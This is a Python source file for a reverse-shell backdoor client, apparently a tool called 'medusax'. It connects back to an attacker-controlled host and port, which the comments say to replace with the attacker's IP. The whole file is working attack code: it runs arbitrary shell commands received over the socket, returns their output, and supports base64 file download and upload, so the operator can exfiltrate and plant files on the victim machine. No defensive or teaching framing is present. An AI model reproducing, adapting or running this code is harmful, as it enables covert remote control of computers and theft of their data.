import socket
import subprocess
import os
import json
import base64


# Function to execute commands on the target machine
def execute_command(command):
    # Execute the command and return the result
    return subprocess.run(command, shell=True, capture_output=True)

# Create a socket object to connect back to the attacker
HOST = "127.0.0.1"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))

    # Send an initial message to show the connection is established
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    def send_json(data):
        json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
        sock.send(json_data.encode())  # Encode to bytes before sending

    def receive_json():
        json_data = ""
        while True:
            try:
                json_data = json_data + sock.recv(1024).decode()  # Decode bytes to string
                return json.loads(json_data)  # Return full file till the end of string/dat
            except ValueError:
                continue

    def read_file(path):
        with open(path, "rb") as file:  # RB for readable binary file
            return base64.b64encode(file.read()).decode()  # Decode bytes to string

    def write_file(path, content):
        with open(path, "wb") as file:  # WB for writable binary file
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"

    while True:
        # Send the current prompt to the server
        sock.sendall(current_prompt.encode("utf-8"))

        # Receive the command from the server
        command = sock.recv(1024).decode("utf-8").strip()

        # Handle the 'km' command to completely disconnect
        if command.lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        # Handle the 'shell' command to enter the shell mode
        if command.lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
            continue

        # Handle the 'shell -d <directory>' command to set a specific directory
        if command.startswith("shell -d"):
            try:
                _, _, directory = command.partition("-d")
                directory = directory.strip()
                os.chdir(directory)  # Change to the specified directory
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
            continue

        # If in shell mode, process shell commands
        if in_shell_mode:
            if command.lower() == "exit":
                # Exit the shell and return to the default prompt
                in_shell_mode = False  # Disable shell mode
                current_prompt = default_prompt
                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
                continue

            # Execute the received shell command
            output = execute_command(command)
            sock.sendall(output.stdout + output.stderr)
            continue

        # Handle 'download' and 'upload' commands
        if command.startswith("download"):
            file_path = command.split(" ")[1]
            send_json(["download", file_path, read_file(file_path)])

        elif command.startswith("upload"):
            file_path = command.split(" ")[1]
            file_content = receive_json()
            write_file(file_path, file_content[2])  # File content at index 2
            print("[+] File uploaded successfully [+]")

        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
        sock.sendall("Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.\n".encode("utf-8"))

except Exception as e:
    print(f"Error: {e}")
    sock.close()
